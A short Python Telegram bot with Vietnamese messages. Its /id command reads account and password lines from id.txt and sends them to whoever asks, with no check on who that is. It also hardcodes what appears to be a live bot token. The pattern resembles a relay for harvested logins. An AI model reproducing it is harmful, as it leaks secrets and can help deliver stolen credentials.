from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TOKEN = "7866517134:AAEi06H3piW0NmLhHlhiauGPoC-kbFKhNG8"

async def reply_ytb(update: Update, context: CallbackContext) -> None:
    await update.message.reply_text('Xin chào ytb')

async def reply_id(update: Update, context: CallbackContext) -> None:
    try:
        with open("id.txt", "r") as file:
            lines = file.readlines()
        
        if lines:
            latest_id = lines[-2] if len(lines) >= 2 else "Không có thông tin tài khoản."
            latest_pass = lines[-1] if len(lines) >= 1 else "Không có thông tin mật khẩu."
            response = f"Tài khoản: {latest_id}\nMật khẩu: {latest_pass}"
        else:
            response = "File id.txt không có dữ liệu."
        
        await update.message.reply_text(response)
    except FileNotFoundError:
        await update.message.reply_text("File id.txt không tồn tại.")

def main():
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("ytb", reply_ytb))
    
    application.add_handler(CommandHandler("id", reply_id))
    
    application.run_polling()

if __name__ == '__main__':
    main()
